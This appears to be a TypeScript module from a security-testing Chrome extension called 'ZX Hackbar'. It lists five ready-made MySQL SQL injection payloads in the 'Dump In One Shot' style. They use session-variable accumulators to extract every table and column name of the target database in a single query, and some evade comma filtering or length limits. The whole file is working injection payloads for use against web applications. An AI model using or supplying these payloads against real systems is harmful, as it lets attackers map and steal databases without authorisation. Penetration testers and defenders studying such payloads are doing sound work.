/**
 * ZX HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module UnionBasedLocalVarDios
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description Local session variable (@:=) based Dump In One Shot templates.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const localVarDiosTemplates: BuilderTemplate[] = [
  {
    id: 'local-var-dios-subquery-loop',
    name: 'Local Variable Subquery Loop',
    description: 'Unlimited local schema extraction using session variable loop (bypasses 1024 limit)',
    content: '(SELECT(@a)FROM(SELECT(@a:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a)AND(@a:=CONCAT(@a,0x0a,table_name,0x3a,column_name))))a)'
  },
  {
    id: 'local-var-dios-export-set',
    name: 'Local export_set() Variable DIOS',
    description: 'Local database schema dump using export_set() variable accumulator',
    content: '(SELECT export_set(5,@:=0,(SELECT count(*) FROM information_schema.columns WHERE table_schema=database() AND @:=concat(@,0x0a,table_name,0x3a,column_name)),@,2))'
  },
  {
    id: 'local-var-dios-make-set',
    name: 'Local make_set() Variable DIOS',
    description: 'Local schema dump using make_set() bitwise accumulator',
    content: '(SELECT make_set(6,@:=0x0a,(SELECT count(*) FROM information_schema.columns WHERE table_schema=database() AND @:=concat(@,table_name,0x3a,column_name,0x0a)),@))'
  },
  {
    id: 'local-var-dios-dual',
    name: 'Local Dual Variable Splitter (@t & @c)',
    description: 'Stores local tables in @t and columns in @c separately for clear formatting',
    content: '(SELECT(@res)FROM(SELECT(@t:=0x00),(@c:=0x00),(@res:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@res:=concat(@res,0x0a,@t:=table_name,0x203d3e20,@c:=column_name))))x)'
  },
  {
    id: 'local-var-dios-no-comma',
    name: 'Local No-Comma JOIN Variable DIOS',
    description: 'Local variable schema dump initialized with JOIN (no commas)',
    content: '(SELECT(@a)FROM(SELECT(1))x JOIN(SELECT(@a:=0x00))y JOIN(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a:=concat(@a,0x0a,table_name,0x3a,column_name)))z)'
  }
];

export const localVarDiosSubcategory: BuilderSubcategory = {
  id: 'local-var-dios',
  label: 'Local Variable Dios',
  description: 'Local schema variable-based DIOS templates filtered by database() without 1024 limit',
  templates: localVarDiosTemplates
};
